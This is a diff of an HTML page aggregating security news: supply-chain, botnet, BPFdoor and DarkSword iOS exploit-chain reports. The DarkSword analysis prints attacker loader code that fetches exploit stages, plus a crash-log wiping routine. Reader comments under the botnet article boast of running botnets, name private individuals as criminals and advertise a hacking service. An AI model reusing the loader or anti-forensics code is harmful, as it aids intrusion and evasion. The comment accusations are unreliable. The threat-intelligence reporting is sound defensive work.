-It's currently not known how the package's PYPI_TOKEN was obtained by TeamPCP, but it's likely that it was through a prior credential harvesting operation.
-"We believe the most likely vector is the litellm compromise itself," Endor Labs researchers Kiran Raj and Rachana Misal said. "TeamPCP's harvester swept environment variables, .env files, and shell histories from every system that imported litellm. If any developer or CI pipeline had both litellm installed and access to the telnyx PyPI token, that token was already in TeamPCP's hands."
-In a security notice shared on its website, the maintainers of the Python package [said](https://telnyx.com/resources/telnyx-python-sdk-supply-chain-security-notice-march-2026) both unauthorized versions have been removed from PyPI and that users are likely to be affected if they installed or upgraded the library between 03:51 UTC and 10:13 UTC on March 27, 2026. Telnyx said it's also investigating how the publishing credentials were obtained by the threat actors.
-What's notable about the attack is the absence of a persistence mechanism in Linux and macOS and the use of a temporary directory to conduct the malicious actions and recursively delete all its contents once everything is complete.
-"The strategic split is clear. Windows gets persistence: a binary in the Startup folder that survives reboots, providing the threat actor with long-term, repeatable access," Socket explained. "Linux/macOS gets smash-and-grab: a single, high-speed data harvesting operation that collects everything of value and exfiltrates it immediately, then vanishes."
-The development comes a few days after the threat actor [distributed](https://www.wiz.io/blog/threes-a-crowd-teampcp-trojanizes-litellm-in-continuation-of-campaign) trojanized versions of the popular litellm Python package to exfiltrate cloud credentials, CI/CD secrets, and keys to a domain under its control.
-The supply chain incident also reflects a new-found maturation, where the threat actor has consistently infected legitimate, trusted packages with massive user bases to distribute malware to downstream users and widen blast radius, rather than directly publishing malicious typosquats to open-source package repositories.
-"The target selection across this campaign focuses on tools with elevated access to automated pipelines: a container scanner (Trivy), an infrastructure scanning tool (KICS), and an AI model routing library (litellm)," Snyk [said](https://snyk.io/articles/poisoned-security-scanner-backdooring-litellm/). "Each of these tools requires broad read access to the systems it operates on (credentials, configs, environment variables) by design."
-To mitigate the threat, developers are advised to perform the following actions -
-- Audit Python environments and requirements.txt files for telnyx==4.87.1 or telnyx==4.87.2. If found, replace them with a clean version.
-- Assume compromise and rotate all secrets.
-- Look for a file named "msbuild.exe" in the Windows Startup folder.
-- Block the C2 and exfiltration domain ("83.142.209[.]203").
-The compromise is part of a broader, ongoing campaign undertaken by [TeamPCP](https://mrcloudbook.com/teampcp-supply-chain-attack-telnyx-canisterworm-full-analysis-cve-2026-33634/) spanning multiple ecosystems, with the threat actor announcing collaborations with other cybercriminal groups like LAPSUS$ and an emerging ransomware group called [Vect](https://www.halcyon.ai/ransomware-alerts/emerging-ransomware-group-vect) to conduct extortion and ransomware operations.
-"Supposedly, the group harvested a ton of credentials over the course of the last few attacks, and teaming up allows scaling/accelerating their (ab)use before all the victims completed remediation," Henrik Plate, head of security research at Endor Labs, told The Hacker news. "Depending on the credentials, 'downstream threat actors' will continue according to their focus, e.g., ransomware attacks."
-This also signals a shift where ransomware gangs, which have historically focused on initial access methods like phishing and exploitation of security flaws, are now weaponizing supply chain attacks targeting the open source infrastructure as an entry point for follow-on attacks.
-"This puts a spotlight on anything in CI/CD environments that isn’t locked down," Socket [said](https://socket.dev/blog/teampcp-partners-with-vect-targeting-oss-supply-chains). "Security scanners, IDE extensions, build tooling, and execution environments are granted broad access because they’re expected to need it. When attackers are targeting the tools themselves, anything running in the pipeline has to be treated as a potential entry point."
-[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
-            <button onclick="window.scrollTo(0,0)" style="margin-top:20px; color:#888; border:1px solid #444; padding:5px;">[↑ Back to Menu]</button>
-            <hr style="border:0; border-top:1px dashed #333; margin:40px 0;">
+            <h2 class="article-title">CISA Adds Five Known Exploited Vulnerabilities to Catalog</h2>
+            <p class="source-link">Source: All CISA Advisories | <a href="https://www.cisa.gov/news-events/alerts/2026/03/20/cisa-adds-five-known-exploited-vulnerabilities-catalog" target="_blank">Original Link</a></p>
+            <div class="content-text">CISA Adds Five Known Exploited Vulnerabilities to Catalog
+CISA has added five new vulnerabilities to its [Known Exploited Vulnerabilities (KEV) Catalog](/known-exploited-vulnerabilities-catalog), based on evidence of active exploitation.
+[CVE-2025-31277](https://www.cve.org/CVERecord?id=CVE-2025-31277)Apple Multiple Products Buffer Overflow Vulnerability[CVE-2025-32432](https://www.cve.org/CVERecord?id=CVE-2025-32432)Craft CMS Code Injection Vulnerability[CVE-2025-43510](https://www.cve.org/CVERecord?id=CVE-2025-43510)Apple Multiple Products Improper Locking Vulnerability[CVE-2025-43520](https://www.cve.org/CVERecord?id=CVE-2025-43520)Apple Multiple Products Classic Buffer Overflow Vulnerability[CVE-2025-54068](https://www.cve.org/CVERecord?id=CVE-2025-54068)Laravel Livewire Code Injection Vulnerability
+These types of vulnerabilities are frequent attack vectors for malicious cyber actors and pose significant risks to the federal enterprise.
+[Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities](/binding-operational-directive-22-01) established the KEV Catalog as a living list of known Common Vulnerabilities and Exposures (CVEs) that carry significant risk to the federal enterprise. BOD 22-01 requires Federal Civilian Executive Branch (FCEB) agencies to remediate identified vulnerabilities by the due date to protect FCEB networks against active threats. See the [BOD 22-01 Fact Sheet](/sites/default/files/publications/Reducing_the_Significant_Risk_of_Known_Exploited_Vulnerabilities_211103.pdf) for more information.
+Although BOD 22-01 only applies to FCEB agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of [KEV Catalog vulnerabilities](/known-exploited-vulnerabilities-catalog) as part of their vulnerability management practice. CISA will continue to add vulnerabilities to the catalog that meet the [specified criteria](/known-exploited-vulnerabilities).
+This product is provided subject to this [Notification](/notification) and this [Privacy & Use](/privacy-policy) policy.</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
         </div>
         <div id="art-7" class="article-body">
-            <h2 style="color:#00FF00">>>> Fake VS Code alerts on GitHub spread malware to developers</h2>
-            <p style="color:#666">Source: <a href="https://www.bleepingcomputer.com/news/security/fake-vs-code-alerts-on-github-spread-malware-to-developers/" target="_blank" style="color:#666;">https://www.bleepingcomputer.com/news/security/fake-vs-code-alerts-on-github-spread-malware-to-developers/</a></p>
-            <div class="content-text">A large-scale campaign is targeting developers on GitHub with fake Visual Studio Code (VS Code) security alerts posted in the Discussions section of various projects, to trick users into downloading malware. [...]
-
-[Full content could not be extracted. Visit source for details.]</div>
-            <button onclick="window.scrollTo(0,0)" style="margin-top:20px; color:#888; border:1px solid #444; padding:5px;">[↑ Back to Menu]</button>
-            <hr style="border:0; border-top:1px dashed #333; margin:40px 0;">
+            <h2 class="article-title">Feds Disrupt IoT Botnets Behind Huge DDoS Attacks</h2>
+            <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/03/feds-disrupt-iot-botnets-behind-huge-ddos-attacks/" target="_blank">Original Link</a></p>
+            <div class="content-text">The U.S. Justice Department joined authorities in Canada and Germany in dismantling the online infrastructure behind four highly disruptive botnets that compromised more than three million Internet of Things (IoT) devices, such as routers and web cameras. The feds say the four botnets — named Aisuru, Kimwolf, JackSkid and Mossad — are responsible for a series of recent record-smashing distributed denial-of-service (DDoS) attacks capable of knocking nearly any target offline.
+The Justice Department said the Department of Defense Office of Inspector General’s (DoDIG) Defense Criminal Investigative Service (DCIS) executed seizure warrants targeting multiple U.S.-registered domains, virtual servers, and other infrastructure involved in DDoS attacks against Internet addresses owned by the DoD.
+The government alleges the unnamed people in control of the four botnets used their crime machines to launch hundreds of thousands of DDoS attacks, often demanding extortion payments from victims. Some victims reported tens of thousands of dollars in losses and remediation expenses.
+The oldest of the botnets — Aisuru — issued more than 200,000 attacks commands, while JackSkid hurled at least 90,000 attacks. Kimwolf issued more than 25,000 attack commands, the government said, while Mossad was blamed for roughy 1,000 digital sieges.
+The DOJ [said](https://www.justice.gov/usao-ak/pr/authorities-disrupt-worlds-largest-iot-ddos-botnets-responsible-record-breaking-attacks) the law enforcement action was designed to prevent further infection to victim devices and to limit or eliminate the ability of the botnets to launch future attacks. The case is being investigated by the DCIS with help from the FBI’s field office in Anchorage, Alaska, and the DOJ’s statement credits nearly two dozen technology companies with assisting in the operation.
+“By working closely with DCIS and our international law enforcement partners, we collectively identified and disrupted criminal infrastructure used to carry out large-scale DDoS attacks,” said Special Agent in Charge Rebecca Day of the FBI Anchorage Field Office.
+Aisuru emerged in late 2024, and by mid-2025 it was launching [record-breaking DDoS attacks](https://krebsonsecurity.com/2025/10/ddos-botnet-aisuru-blankets-us-isps-in-record-ddos/) as it rapidly infected new IoT devices. In October 2025, Aisuru was used to seed Kimwolf, an Aisuru variant which introduced a novel spreading mechanism that allowed the botnet to infect devices hidden behind the protection of the user’s internal network.
+On January 2, 2026, the security firm Synthient [publicly disclosed](https://krebsonsecurity.com/2026/01/the-kimwolf-botnet-is-stalking-your-local-network/) the vulnerability Kimwolf was using to propagate so quickly. That disclosure helped curtail Kimwolf’s spread somewhat, but since then several other IoT botnets have emerged that effectively copy Kimwolf’s spreading methods while competing for the same pool of vulnerable devices. According to the DOJ, the JackSkid botnet also sought out systems on internal networks just like Kimwolf.
+The DOJ said its disruption of the four botnets coincided with “law enforcement actions” conducted in Canada and Germany targeting individuals who allegedly operated those botnets, although no further details were available on the suspected operators.
+In late February, KrebsOnSecurity identified [a 22-year-old Canadian man](https://krebsonsecurity.com/2026/02/who-is-the-kimwolf-botmaster-dort/) as a core operator of the Kimwolf botnet. Multiple sources familiar with the investigation told KrebsOnSecurity the other prime suspect is a 15-year-old living in Germany.
+good work krebs, hopefully we can target franco who lives in the phillipines next, ask him about his work with xlab (they don’t put articles on him, if he feeds information to them about other botnets..)
+after all of this i still operate a botnet with 180k+ devices even after facing a court date after all i am unstoppable i am “Kieran Ellison after all”.
+Good work DOJ, It amazes me how much havoc a young man from the U.K. can cause. Kieran Ellison. Anyways I’m off to eat curry with para jha.
+where did you get uk from
+he’s still on that kurtaj pack
+Kieran Ellison did it
+nah the bullies you need, big clue, started in the 1980s. kids, pay attention to fuschia shelves’ lies.
+When I first go in DDoS industry, I wasn’t planning on staying in it long. I made my $$$, there’s lots of eyes looking at IOT now, so it’s time to Get The Heck Out. However, I know every skid and their mama, it’s their soaking dream to have something besides moobot.
+Just as I forever be free, you will be doomed to mediocracy forever.
+just as i watched idiocracy in reno in 2009, so shall you too learn about tuna.
+rip syndarks XD, ducky aka kieran Ellison, udp1337, hamlog also known as light the leafon, xpost, snow aka kitty fly hosting DE. I think royale hosting and rustoria never fully recovered after what they did to them. Shaking my head where will I be without all of my boys.
+LONG LIVE SKW and all of their allies
+I remember vividly the friendship between ‘SNOW’ & Dort. They would play mc together and ddos servers. Dort even made a captcha bypass for discord. ‘Dortgen’ it was ahead of it’s time then.
+Allison Nixon from Unit 221B. Will pay for the arrest of Cameron John Wagenius (VarsSec). I hope we don’t meet the same fate brother. If I could I would put money on your books. I remember, I was going to buy the at&t DB from you. Crazy we cross paths once again. That was the night you got fedded. If only I could send you xmr to pay your books.
+Sorrow is botless and i own him skeedss
+Final broadcast from the Asphalt Botnet Team. We thank every men for the support they gave to this community and us. it was Alex Tyler and Kieran Ellison behind all of this.MTFBWYA. Also Black Lives Matter!
+Hailing From The Asphalt Botnet Team. We thank every men for the support they gave to this community. Thanks to Alex & Kieran for bringing all the fun. Thanks to snow for doing what the big firms can’t do~ actually providing stuff thats valuable. And finally MTFBWYA. We are gone. Long live sorrow/ducky. They are behind all of this conspiracy. They support the BLM.
+Exciting for the next bombing on the gauzed eyes strip, Krebs. Lemme know when Caesar Augustus and your band of merry fellows in Knotts Berry Farm wanna have a rewatch party of The War Game. Or I guess your star turn in Grosse Point Blanke.
+William Shane Habdas
+Abigail Habdas
+Litchfield. Let’s have a trade all our legal cases are now prosecutable. I call felony on a pair of jeans I guess the world and Bank of the mislabeled IP address called.
+Sure, let’s file. Fone seems cool.
+it was great fun operating the mossad network with my pals franco and kia, may Kieran Ellison stay on top.
+My new network Wuhan/Dongfeng is also going great! over 200k bots now..
+Apparently bru’s Wuhan botnet in 2024 will bring us all the great random person on twitter, KOVACS, we need back to really add shame up that Madison avenue pill commercial empire in my old LVM partition. Great times, death made at least twenty mil on that case.
+Apparently bru’s Wuhan botnet in 2024 will bring us all the great random person on twitter, KOVACS, we need back to really add shame up that Madison avenue pill commercial empire in my old LVM partition. Great times, death made at least twenty mil on that case.
+Criminals now available to work for the Trump administration.
+Whatever happened too ‘Big Balls’? Not sure what was more impressive, he got beat up by a girl or that he had a date with a real girl.
+related?
+https://www.reddit.com/r/alaska/comments/1repy38/how_many_of_us_are_getting_screwed_by_gci_on_data/
+200,000 attacks commands, 90,000 attacks, 25,000 attack commands, and 1,000 digital sieges… Are those synonyms or are different things being counted?
+get acct pswd, hackerspy_tech on g ma 1L
+Next you should make an article on Deus botnet ran by fern aka james whittaker, he has infected over 700,000 android devices and must be stopped immediately!
+Important work, and needed, but it also highlights the structural gap, botnet takedowns are episodic and after the fact, these networks were already issuing hundreds of thousands of attack commands before disruption, and the underlying model, cheap, distributed, easily reconstituted sources, doesn’t change, what keeps scaling is coordination across millions of nodes, so the real control point has to move from identifying infrastructure to controlling coordinated behavior in real time, if the network can suppress that behavior upstream once it shows up, it starts to matter a lot less which botnet is generating the traffic
+Long live Krebs—great work!</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
         </div>
         <div id="art-8" class="article-body">
-            <h2 style="color:#00FF00">>>> China Upgrades the Backdoor It Uses to Spy on Telcos Globally</h2>
-            <p style="color:#666">Source: <a href="https://www.darkreading.com/threat-intelligence/china-upgrades-backdoor-spy-telcos" target="_blank" style="color:#666;">https://www.darkreading.com/threat-intelligence/china-upgrades-backdoor-spy-telcos</a></p>
-            <div class="content-text">China Upgrades the Backdoor It Uses to Spy on Telcos Globally
-Chinese APT Red Menshen's super-advanced BPFdoor malware defeats traditional cybersecurity protections. All telcos can do, really, is try hunting it down.
-Chinese threat actors have been tinkering with a state-of-the-art backdoor called "BPFdoor," modifying it to more stealthily maintain persistence inside of the most sensitive parts of global telecommunications systems, plus other high-level government and critical infrastructure networks.
-BPFdoor was already one of the world's most sophisticated malware implants before it was upgraded. Its signature trick was to lay dormant inside of a Linux kernel, doing nothing interesting or even observable, while passively using the Berkeley Packet Filter (BPF) to inspect incoming network traffic for a specially crafted activation message.
-Researchers at Rapid7 now report that the Chinese advanced persistent threat (APT) behind BPFdoor, Red Menshen, has modified that listening system. Since around last November, it's also tacked on [a few more stealthy tricks](https://www.rapid7.com/blog/post/tr-bpfdoor-telecom-networks-sleeper-cells-threat-research-report/) to help BPFdoor stay even quieter, and get closer to the heart of telecommunications subscriber traffic worldwide.
-In addition to known [targets in the Middle East](https://www.trendmicro.com/en_us/research/25/d/bpfdoor-hidden-controller.html) and Africa, "We have confirmed victims in the Asia-Pacific (APAC) and in Europe — I dare say this is definitely global," Christiaan Beek, vice president of cyber intelligence at Rapid7, tells Dark Reading. He adds that, perhaps due to the malware's runaway success, "where we thought initially it was mostly focused on telcos, we also now have confirmation from [victimized] government networks, critical infrastructure networks, and defense networks."
-An Ultra-Advanced Telecom Backdoor
-Even BPFdoor's remarkably subtle and efficient BPF listening technique isn't good enough for Red Menshen anymore. Now, instead of looking for a magic packet in any sort of network packet, the malware only looks for its trigger phrase in innocuous [Hypertext Transfer Protocol Secure (HTTPS)](https://www.techtarget.com/searchnetworking/answer/HTTP-vs-HTTPS-Whats-the-difference) requests.
-"They are actually weaponizing our firewalls against us, and we're letting the traffic through," Beek concedes. Firewalls and traffic inspection tools can't reasonably block HTTPS, and even when the request is decrypted, it'll look normal to a human observer or security tool. "So that was a really smart move on [their part] — hiding themselves in that kind of Transport Layer Security (TLS) traffic, so the moment you unpack it, it will actually pass through easily," he says.
-BPFdoor is also specially tuned to know when malicious message lies are coming through. It looks specifically for the 26th byte offset in the incoming request, and if its trigger appears at that specific location, then it knows it's being summoned.
-The trigger phrase is arguably not even BPFdoor's most subtle, highly controlled trick. At an even more granular level, Red Menshen can direct orders to specific instances of its malware within a network, using a lightweight Internet Control Message Protocol (ICMP) control channel.
-It works like this: Let's say that Red Menshen has compromised more than one server in a target network. It could connect and forward instructions to each individual server using a command-and-control (C2) setup, but that would be loud. Theoretically, they could also include data in the activation packet that routes instructions to the desired instance, but that would make the packet more bloated and potentially detectable. So, instead, the malware uses the innocuous ICMP pings to transmit instructions between infected machines, using a specific value — 0xFFFFFFFF — to indicate which machine should terminate the propagation and actually execute an action.
-"No matter how many hops there are in a network, they know exactly where their next [implant in the network](/threat-intelligence/china-liminal-panda-telcos-phone-data) is, and they could actually send a command specifically [to any implant] in the traffic," Beek explains. By way of an analogy, he says, "Let's say you have BPFdoor in your living room. and you have BPFdoor in your kitchen. The actor could actually instruct the BPFdoor in the living room that a command is actually intended for BPFdoor in the kitchen."
-He adds, "That's unbelievable. It's fascinating — how to hide yourself in ping traffic. They knew exactly where there is some space in the network traffic, where you can put in your [malicious] packets. With all due respect, nobody's tracing how much ping traffic goes beyond the host, or outside of the network," he says.
-China vs. Telcos: An Unfair Cyber Fight
-Red Menshen attacks are characterized by an unusual diligence and knowledge of their targets' infrastructure.
-Beek thinks that "they do an extremely good job at reconnaissance in their victims' networks. And they know so much about the inner workings of [telco infrastructure](/cyberattacks-data-breaches/salt-typhoon-exploits-cisco-devices-telco-infrastructure). So the moment they are inside, and they find certain equipment, they know exactly how it works. And that it's interconnected, and then they can move really fast [to other parts of the network]. We found custom sniffers, custom tooling to intercept usernames and passwords — very highly sophisticated operations."
-The detail with which the attackers understand and adapt to their targets' systems is exceptional. For instance, cyber researchers call it "advanced" when malware mimics ordinary system processes to try to evade detection. Red Menshen goes a step further. It knows that telcos, particularly in [Europe](https://www.hpe.com/us/en/newsroom/press-release/2025/10/hpe-collaborates-with-ericsson-to-validate-dual-mode-5g-core-solution-empowering-telco-service-providers-to-deliver-seamless-next-generation-core-networks.html) and [Asia](https://www.hpe.com/us/en/newsroom/press-release/2025/12/hpe-and-chunghwa-telecom-collaborate-to-build-a-disaster-recovery-center.html), are known to use HPE ProLiant servers, and that telcos worldwide are increasingly using [Kubernetes](https://www.cybersecuritydive.com/news/critical-vulnerabilities-kubernetes-jeopardy/743448/) to serve 5G. So nowadays BPFdoor disguises itself using legitimate service names and process behaviors associated with HPE ProLiant servers, or Kubernetes, as applicable.
-Between the passive listening, the covert messaging, the process mimicking, and more, BPFdoor is a league beyond what most cybersecurity solutions can hope to detect and stop. Beek's suggestion, instead, is that operators need to just go out and hunt this thing down.
-The first step in that process, of course, is actually knowing about its existence. Surprisingly, even though the malware is some years old now, it isn't as famous as it deserves to be.
-"Honestly, when I spoke to different telcos, they were quite unaware of this threat, and also the implications of it," Beek says. "I think that the bigger picture here is: Are you really anticipating these threats?"
-About the Author
-You May Also Like
-[Threat Intelligenceby Jai VijayanMar 17, 2026](https://www.darkreading.com/threat-intelligence/hackers-target-cybersecurity-firm-outpost24-phish)
-Hackers Target Cybersecurity Firm Outpost24 in 7-Stage Phish
-[Threat Intelligenceby Rob WrightDec 12, 2025](https://www.darkreading.com/threat-intelligence/react2shell-exploits-flood-internet-attacks-continue)
-React2Shell Exploits Flood the Internet as Attacks Continue
-[Threat Intelligenceby Robert Lemos, Contributing WriterNov 26, 2025](https://www.darkreading.com/threat-intelligence/iran-exploits-cyber-domain-kinetic-strikes)
-Iran Exploits Cyber Domain to Aid Kinetic Strikes
-[Cyberattacks & Data Breachesby Emma ZaballosApr 22, 2025](https://www.darkreading.com/cyberattacks-data-breaches/deepseek-breach-opens-floodgates-dark-web)</div>
-            <button onclick="window.scrollTo(0,0)" style="margin-top:20px; color:#888; border:1px solid #444; padding:5px;">[↑ Back to Menu]</button>
-            <hr style="border:0; border-top:1px dashed #333; margin:40px 0;">
+            <h2 class="article-title">The Proliferation of DarkSword: iOS Exploit Chain Adopted by Multiple Threat Actors</h2>
+            <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/darksword-ios-exploit-chain/" target="_blank">Original Link</a></p>
+            <div class="content-text">The Proliferation of DarkSword: iOS Exploit Chain Adopted by Multiple Threat Actors
+Google Threat Intelligence Group
+Google Threat Intelligence
+Visibility and context on the threats that matter most.
+[Contact Us & Get a Demo](https://cloud.google.com/security/resources/google-threat-intelligence-demo?utm_source=cgc-blog&utm_medium=blog&utm_campaign=FY25-Q2-global-GCP30649-website-su-dgcsm-GTI-interest)
+Introduction
+Google Threat Intelligence Group (GTIG) has identified a new iOS full-chain exploit that leveraged multiple zero-day vulnerabilities to fully compromise devices. Based on toolmarks in recovered payloads, we believe the exploit chain to be called DarkSword. Since at least November 2025, GTIG has observed multiple commercial surveillance vendors and suspected state-sponsored actors utilizing DarkSword in distinct campaigns. These threat actors have deployed the exploit chain against targets in Saudi Arabia, Turkey, Malaysia, and Ukraine.
+DarkSword supports iOS versions 18.4 through 18.7 and utilizes six different vulnerabilities to deploy final-stage payloads. GTIG has identified three distinct malware families deployed following a successful DarkSword compromise: GHOSTBLADE, GHOSTKNIFE, and GHOSTSABER. The proliferation of this single exploit chain across disparate threat actors mirrors the previously discovered [Coruna iOS exploit kit](https://cloud.google.com/blog/topics/threat-intelligence/coruna-powerful-ios-exploit-kit). Notably, UNC6353, a suspected Russian espionage group previously observed using Coruna, has recently incorporated DarkSword into their watering hole campaigns.
+In this blog post, we examine the uses of DarkSword by these distinct threat actors, provide an analysis of their final-stage payloads, and describe the vulnerabilities leveraged by DarkSword. GTIG reported the vulnerabilities used in DarkSword to Apple in late 2025, and all vulnerabilities were patched with the release of iOS 26.3 (although most were patched prior). We have added domains involved in DarkSword delivery to [Safe Browsing](https://safebrowsing.google.com/), and strongly urge users to update their devices to the latest version of iOS. In instances where an update is not possible, it is recommended that [Lockdown Mode](https://support.apple.com/en-us/105120) be enabled for enhanced security.
+This research is published in coordination with our industry partners at [Lookout](https://www.lookout.com/blog/darksword) and [iVerify](https://iverify.io/blog/darksword-ios-exploit-kit-explained).
+Discovery Timeline
+GTIG has identified several different users of the DarkSword exploit chain dating back to November 2025. In addition to the case studies on DarkSword usage documented in this blog post, we assess it is likely that other commercial surveillance vendors or threat actors may also be using DarkSword.
+Figure 1: Timeline of DarkSword observations and vulnerability patches
+Saudi Arabian Users Targeted via Snapchat-Themed Website (UNC6748)
+In early November 2025, GTIG identified the threat cluster UNC6748 leveraging a Snapchat-themed website, snapshare[.]chat
+, to target Saudi Arabian users (Figure 2). The landing page on the website included JavaScript code using a mix of obfuscation techniques, and created a new IFrame that pulled in another resource at frame.html
+(Figure 3). The landing page JavaScript also set a session storage key named uid
+, and checked if that key was already set prior to creating the IFrame that fetches the next delivery stage. We assess this is to prevent re-infecting prior victims. In subsequent observations of UNC6748 throughout November 2025, we observed them update the landing page to include anti-debugging and additional obfuscation to hinder analysis. We also identified additional code added when the actor attempts to infect a user using Chrome, where the x-safari-https
+protocol handler is used to open the page in Safari (Figure 4). This suggests that UNC6748 didn't have an exploit chain for Chrome at the time of this activity. During the infection process, the victim is redirected to a legitimate Snapchat website in an attempt to masquerade the activity.
+frame.html
+is a simple HTML file that dynamically injects a new script
+tag that loads in the main exploit loader, rce_loader.js
+(Figure 5). The loader performs some initialization used by subsequent stages, and fetches a remote code execution (RCE) exploit from the server using XMLHttpRequest
+(Figure 6).
+We observed UNC6748 activity multiple times throughout November 2025, where both major and minor updates were made to their infection process:
+-
+The first UNC6748 activity we observed only had support for one RCE exploit split across two files,
+rce_module.js
+andrce_worker_18.4.js
+(Figure 7). This exploit primarily leveraged CVE-2025-31277, a memory corruption vulnerability in JavaScriptCore (the JavaScript engine used in WebKit and Apple Safari), and also CVE-2026-20700, a Pointer Authentication Codes (PAC) bypass indyld
+. -
+We then identified activity several days later where another RCE exploit was added,
+rce_worker_18.6.js
+(Figure 8). This exploit used CVE-2025-43529, a different memory corruption vulnerability in JavaScriptCore, alongside the same CVE-2026-20700 exploit in the same file. -
+The loader was modified to also fetch a
+rce_module_18.6.js
+payload, which only defined a simple function that was not observed in use elsewhere. -
+However, the logic implemented for this did not correctly serve the iOS 18.4 exploit if the device version wasn't 18.6, and did not account for the existence of iOS 18.7, even though it was released two months prior in September 2025. This suggests that this update may have been originally written months prior to UNC6748 acquiring and/or deploying it.
+-
+Later in November 2025, we observed another module added,
+rce_worker_18.7.js
+(Figure 9). This was an updated version ofrce_worker_18.6.js
+, but with offsets added to support iOS 18.7. -
+There was also a logic flaw in the loader in this case, as it loaded the exploit for iOS 18.7 regardless of the detected device version.
+In our observations, UNC6748 used the same modules for sandbox escapes and privilege escalation, along with the same final payload, GHOSTKNIFE.
+Figure 2: snapshare[.]chat decoy page
+if (!sessionStorage.getItem("uid") && isTouchScreen) {
+sessionStorage.setItem("uid", '1');
+const frame = document.createElement("iframe");
+frame.src = "frame.html?" + Math.random();
+frame.style.height = 0;
+frame.style.width = 0;
+frame.style.border = "none";
+document.body.appendChild(frame);
+} else {
+top.location.href = "red";
+}
+Figure 3: Landing page snippet that loads frame.html
+(UNC6748, November 2025)
+<!DOCTYPE html>
+<html>
+<head>
+<title></title>
+</head>
+<body>
+<script type="text/javascript">document.write('<script defer=\"defer\" src=\"rce_loader.js\"\>\<\/script\>');</script>
+</body>
+</html>
+Figure 4: frame.html
+contents (UNC6748, November 2025)
+if (typeof browser !== "undefined" || !isIphone()) {
+console.log("");
+} else {
+location.href = "x-safari-https://snapshare.chat/<redacted>";
+}
+Figure 5: Landing page code snippet showing x-safari-https
+use (UNC6748, November 2025)
+function getJS(fname,method = 'GET')
+{
+try
+{
+url = fname;
+print(`trying to fetch ${method} from: ${url}`);
+let xhr = new XMLHttpRequest();
+xhr.open("GET", `${url}` , false);
+xhr.send(null);
+return xhr.responseText;
+}
+catch(e)
+{
+print("got error in getJS: " + e);
+}
+}
+Figure 6: rce_loader.js
+snippet showing the logic for fetching additional stages (UNC6748, November 2025)
+let workerCode = "";
+workerCode = getJS(`rce_worker_18.4.js`); // local version
+let workerBlob = new Blob([workerCode],{type:'text/javascript'});
+let workerBlobUrl = URL.createObjectURL(workerBlob);
+Figure 7: rce_loader.js
+snippet showing a single RCE exploit worker being loaded (UNC6748, November 2025)
+let workerCode = "";
+if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
+workerCode = getJS(`rce_worker_18.6.js?${Date.now()}`); // local version
+else
+workerCode = getJS(`rce_worker_18.6.js?${Date.now()}`); // local version
+let workerBlob = new Blob([workerCode],{type:'text/javascript'});
+let workerBlobUrl = URL.createObjectURL(workerBlob);
+Figure 8: rce_loader.js
+snippet showing (attempted) support for different RCE exploit workers (UNC6748, November 2025)
+let workerCode = "";
+if(ios_version == '18,7')
+workerCode = getJS(`rce_worker_18.7.js?${Date.now()}`); // local version
+else
+workerCode = getJS(`rce_worker_18.7.js?${Date.now()}`); // local version
+let workerBlob = new Blob([workerCode],{type:'text/javascript'});
+let workerBlobUrl = URL.createObjectURL(workerBlob);
+Figure 9: rce_loader.js
+snippet with iOS 18.7 support added (UNC6748, November 2025)
+GHOSTKNIFE
+In this activity, we observed UNC6748 deploy a backdoor GTIG tracks as GHOSTKNIFE. GHOSTKNIFE, written in JavaScript, has several modules for exfiltrating different types of data, including signed-in accounts, messages, browser data, location history, and recordings. It also supports downloading files from the C2 server, taking screenshots, and recording audio from the device's microphone. GHOSTKNIFE communicates with its C2 server using a custom binary protocol over HTTP, encrypted using a scheme based on ECDH and AES. GHOSTKNIFE can update its config with new parameters from its C2 server.
+GHOSTKNIFE writes files to disk during its execution under /tmp/<uuid>.<numbers>
+, where uuid
+is a randomly generated UUIDv4 value and numbers
+is a hard-coded sequence of several digits. Under that directory, it creates multiple subfolders including STORAGE
+, DATA
+, and TMP
+. As each module of GHOSTKNIFE executes, it writes its data to /tmp/<uuid>.<numbers>/STORAGE/<uuid2>.<id>
+, where id
+is the numeric value of the module and uuid2
+is a different randomly generated UUIDv4 value. Additionally, GHOSTKNIFE periodically erases crash logs from the device to cover its tracks in case of unexpected failures (Figure 10).
+cleanLogs(){
+let files = MyHelper.getContentsOfDir("/var/mobile/Library/Logs/CrashReporter/");
+for(let file of files){//.ips // mediaplaybackd-" panic-full-
+if(file.includes("mediaplaybackd") || file.includes("SpringBoard") || file.includes("com.apple.WebKit.") || file.includes("panic-full-") ){
+MyHelper.deleteFileAtPath(file);
+}
+}
+}
+Figure 10: GHOSTKNIFE snippet responsible for deleting crash logs
+Campaigns Targeting Users in Turkey and Malaysia (PARS Defense)
+In late November 2025, GTIG observed activity associated with the Turkish commercial surveillance vendor PARS Defense where DarkSword was used in Turkey, with support for iOS 18.4-18.7. Unlike the UNC6748 activity, this campaign was carried out with more attention to OPSEC, with obfuscation applied to the exploit loader and some of the exploit stages, and the use of ECDH and AES to encrypt exploits between the server and the victim (Figure 11). Additionally, the obfuscated version of rce_loader.js
+used by PARS Defense fetched the correct RCE exploit depending on the detected iOS version (Figure 12).
+Subsequently, in January 2026, GTIG observed additional activity in Malaysia associated with a different PARS Defense customer. In this case, we were able to collect a different loader used in the activity, which contains additional device fingerprinting logic, and also used the uid
+session storage check. This loader also uses the top.location.href
+redirect for targets that do not pass all of the checks like UNC6748 did, but also sets window.location.href
+to the same URL (Figure 13).
+Where available, GTIG identified a different final payload used in this activity, a backdoor we track as GHOSTSABER.
+function getJS(_0x12fba8) {
+const _0x35744f = generateKeyPair();
+const _0x4a6eb4 = exportPublicKeyAsPem(_0x35744f.publicKey);
+const _0x1bc168 = self.btoa(_0x4a6eb4);
+const _0x119092 = {
+'a': _0x1bc168
+};
+_0x12fba8 = _0x12fba8.startsWith('/') ? _0x12fba8 : '/' + _0x12fba8;
+const _0x1fedd2 = new XMLHttpRequest();
